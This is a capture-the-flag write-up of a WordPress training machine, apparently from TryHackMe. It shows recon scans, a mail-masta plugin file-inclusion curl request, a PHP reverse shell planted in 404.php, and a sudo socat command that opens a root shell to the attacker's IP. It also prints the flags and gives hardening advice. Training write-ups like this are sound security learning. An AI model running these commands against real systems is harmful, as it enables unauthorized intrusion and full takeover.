1. Introduction
I conducted a penetration test on a virtual machine as part of a training exercise. The project objectives were:

Gain initial access to the system by exploiting web application vulnerabilities.

Escalate privileges to root.

Locate and decode hidden flags (user.txt and root.txt).

2. Methodology
Phase 1: Reconnaissance

Performed port scanning using:

bash
nmap -p- -A -T4 10.201.89.220
Discovered open ports:

21 (FTP): Anonymous login allowed (no useful data).

22 (SSH): Secured (no immediate entry).

80 (HTTP): Apache web server running WordPress.

Phase 2: Web Application Exploitation

Identified the /wordpress directory using gobuster:

bash
gobuster dir -u http://10.201.89.220 -w /usr/share/wordlists/dirb/common.txt
Exploited Local File Inclusion (LFI) in the mail-masta plugin:

bash
curl "http://10.201.89.220/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
Extracted wp-config.php in Base64 and decoded it to retrieve database credentials:

bash
echo "PD9waHA..." | base64 -d
Phase 3: Reverse Shell Access

Injected a PHP reverse shell into 404.php (WordPress theme template):

php
<?php
$ip = '10.201.31.69';  // My attacker IP
$port = 1234;
// ... (reverse shell code)
?>
Executed the shell by visiting:
http://10.201.89.220/wordpress/wp-content/themes/twentytwenty/404.php

Captured the connection with Netcat:

bash
nc -nlvp 1234
Gained initial access as www-data.

Phase 4: Privilege Escalation

Discovered credentials for user elyana in /home/elyana/private.txt:

bash
cat /home/elyana/private.txt
Switched to elyana:

bash
su elyana
Identified sudo privileges for /usr/bin/socat:

bash
sudo -l
Exploited socat to gain root access:

bash
sudo socat tcp-connect:10.201.31.69:4444 exec:bash,pty,stderr,setsid,sigint,sane
3. Results
User Flag:

bash
cat /home/elyana/user.txt
Decoded from Base64:

bash
echo "VEhNezQ5amc2..." | base64 -d
Flag: THM{49jg666alb5e76shrusn49jg666alb5e76shrusn}

Root Flag:

bash
cat /root/root.txt
Decoded from Base64:

bash
echo "VEhNe3VlbTJ3aWdid..." | base64 -d
Flag: THM{uem2wigbuem2wigb68sn2j1ospi86sn2j1ospi8}

4. Conclusion
Through this project, I:

Conducted thorough reconnaissance with nmap and gobuster.

Exploited LFI to extract sensitive credentials.

Gained initial access via a reverse shell.

Performed horizontal escalation to elyana and vertical escalation to root using sudo socat.

Successfully retrieved and decoded both flags.

Key Takeaways:

Web Vulnerabilities: LFI remains a critical attack vector in poorly configured web apps.

Privilege Escalation: Always check sudo -l for misconfigurations.

Persistence: Tools like socat can bypass restrictions for root access.

The project was completed successfully, with all objectives achieved. The most challenging part was privilege escalation, but analyzing sudo permissions revealed the optimal path.

Suggestions for Improvement:

Implement stricter file permissions on /home/elyana/private.txt.

Disable unnecessary sudo privileges (e.g., restrict socat).

Monitor for unauthorized edits to WordPress template files.

This exercise significantly improved my skills in offensive security and vulnerability analysis.
